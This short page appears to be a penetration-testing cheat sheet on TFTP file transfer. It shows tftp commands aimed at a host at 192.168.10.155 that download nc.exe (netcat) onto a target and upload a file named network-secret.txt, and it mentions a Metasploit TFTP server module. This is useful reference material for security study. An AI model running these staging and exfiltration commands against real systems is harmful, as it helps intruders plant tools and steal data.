<title>TFTP</title>
</head><body>TFTP<br/>
<br/>
Start Daemon:<br/>
atftpd –daemon –port 69 /tmp/<br/>
<br/>
Transfer files using the “i” switch:<br/>
tftp -i 192.168.10.155 GET nc.exe<br/>
tftp -i 192.168.10.155 PUT network-secret.txt<br/>
<br/>
Note: Most corporate firewalls will block outbound traffic rendering TFTP unusable. TFTP might not be on Windows machines. Files transf­erred will usually be read only. Change attrib of file to delete using attrib -r filename.<br/>
<br/>
Metasploit, like with FTP, has an auxiliary TFTP server module at auxiliary/server/tftp. Set the module options, including TFTPROOT, which determines which directory to serve up, and OUTPUTPATH if you want to capture TFTP uploads from Windows as well.<br/>
<br/>
Sidenote: Installing TFTP. As I mentioned, TFTP is not included by default on newer versions of Windows. If you really wanted to, you can actually enable TFTP from the command line:<br/>
pkgmgr /iu:&quot;TFTP&quot; </body></html>
